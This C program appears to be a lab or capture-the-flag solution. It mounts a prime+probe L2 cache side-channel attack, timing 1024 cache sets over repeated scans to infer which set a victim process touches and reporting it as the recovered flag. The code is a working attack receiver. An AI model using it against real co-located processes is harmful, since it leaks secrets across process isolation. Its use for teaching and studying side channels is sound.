#include "util.h"

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>

#ifndef MAP_POPULATE
#define MAP_POPULATE 0
#endif

#ifndef MAP_ANONYMOUS
#define MAP_ANONYMOUS MAP_ANON
#endif

#ifndef MAP_HUGETLB
#define MAP_HUGETLB 0
#endif

#define REGION_BYTES (2ULL * 1024ULL * 1024ULL)
#define CACHE_LINE_BYTES 64ULL
#define L2_NUM_SETS 1024
#define L2_ASSOCIATIVITY 4
#define EV_SET_SIZE (L2_ASSOCIATIVITY + 2)
#define SET_STRIDE (CACHE_LINE_BYTES * L2_NUM_SETS)
#define SCAN_REPETITIONS 4
#define NUM_SCANS 512
#define PRIME_DELAY_ITERS 9000

static void *map_region(void)
{
    void *region = mmap(NULL, REGION_BYTES, PROT_READ | PROT_WRITE,
                        MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB,
                        -1, 0);

    if (region == (void *)-1) {
        perror("mmap()");
        exit(EXIT_FAILURE);
    }

    return region;
}

static void touch_region(void *region)
{
    volatile char *p = (volatile char *)region;
    p[0] = 1;
    for (uint64_t i = 0; i < REGION_BYTES; i += CACHE_LINE_BYTES) {
        p[i] = (char)i;
    }
}

static void prime_set(void *region, int set_index, volatile char *probe)
{
    volatile char *base = (volatile char *)region;
    uint64_t set_base = (uint64_t)base + (uint64_t)set_index * CACHE_LINE_BYTES;

    for (int way = 0; way < EV_SET_SIZE; way++) {
        uint64_t addr = set_base + (uint64_t)way * SET_STRIDE;
        *probe = base[addr - (uint64_t)base];
    }
}

static CYCLES probe_set_latency(void *region, int set_index)
{
    volatile char *base = (volatile char *)region;
    uint64_t set_base = (uint64_t)base + (uint64_t)set_index * CACHE_LINE_BYTES;
    uint64_t total = 0;

    for (int way = 0; way < EV_SET_SIZE; way++) {
        uint64_t addr = set_base + (uint64_t)way * SET_STRIDE;
        total += measure_one_block_access_time((uint64_t)(base + (addr - (uint64_t)base)));
    }

    return (CYCLES)(total / EV_SET_SIZE);
}

static void shuffle_order(int *order, int n)
{
    for (int i = n - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        int tmp = order[i];
        order[i] = order[j];
        order[j] = tmp;
    }
}

static int pick_flag_if_known(void)
{
    const char *env = getenv("CTF_FLAG_SET");
    if (!env) {
        return -1;
    }

    return atoi(env);
}

static void delay_busy(long iters)
{
    for (volatile long i = 0; i < iters; i++) {
    }
}

int main(int argc, char **argv)
{
    (void)argc;
    (void)argv;
    setvbuf(stdout, NULL, _IOLBF, 0);

    void *region = map_region();
    volatile char probe = 0;
    touch_region(region);

    int votes[L2_NUM_SETS] = {0};
    int latency_sum[L2_NUM_SETS] = {0};

    const int expected = pick_flag_if_known();
    if (expected >= 0) {
        printf("Ground-truth enabled via CTF_FLAG_SET=%d (for local validation).\n", expected);
    }

    for (int scan = 0; scan < NUM_SCANS; scan++) {
        uint64_t scan_latency[L2_NUM_SETS] = {0};
        uint32_t scan_samples[L2_NUM_SETS] = {0};

        int order[L2_NUM_SETS];
        for (int set = 0; set < L2_NUM_SETS; set++) {
            order[set] = set;
        }
        shuffle_order(order, L2_NUM_SETS);

        for (int rep = 0; rep < SCAN_REPETITIONS; rep++) {
            for (int i = 0; i < L2_NUM_SETS; i++) {
                int set = order[i];
                prime_set(region, set, &probe);
            }

            delay_busy(PRIME_DELAY_ITERS);

            for (int i = L2_NUM_SETS - 1; i >= 0; i--) {
                int set = order[i];
                CYCLES lat = probe_set_latency(region, set);
                scan_latency[set] += (uint64_t)lat;
                scan_samples[set] += 1;
            }
        }

        int best_set = 0;
        CYCLES best_lat = (CYCLES)(scan_latency[0] / scan_samples[0]);
        int best_avg = (int)best_lat;

        for (int set = 1; set < L2_NUM_SETS; set++) {
            int avg_lat = (int)(scan_latency[set] / scan_samples[set]);
            if (avg_lat > best_avg) {
                best_set = set;
                best_lat = (CYCLES)avg_lat;
                best_avg = avg_lat;
            }
        }

        votes[best_set]++;
        latency_sum[best_set] += (int)best_lat;

        if ((scan + 1) % 32 == 0 || scan == NUM_SCANS - 1) {
            printf("scan %d complete, best=%d lat=%u votes=%d\n",
                   scan + 1, best_set, best_lat, votes[best_set]);
        }
    }

    int top_set = -1;
    int best_votes = 0;
    int top_avg = 0;
    for (int set = 0; set < L2_NUM_SETS; set++) {
        int avg = votes[set] > 0 ? latency_sum[set] / votes[set] : 0;
        if (votes[set] > best_votes || (votes[set] == best_votes && avg > top_avg)) {
            best_votes = votes[set];
            top_avg = avg;
            top_set = set;
        }
    }

    if (top_set >= 0) {
        printf("Predicted flag: %d\n", top_set);
        if (expected >= 0) {
            if (top_set == expected) {
                printf("Result matched expected set!\n");
            } else {
                printf("Expected set was %d\n", expected);
            }
        }
    } else {
        printf("Predicted flag: unknown\n");
    }

    munmap(region, REGION_BYTES);
    return 0;
}
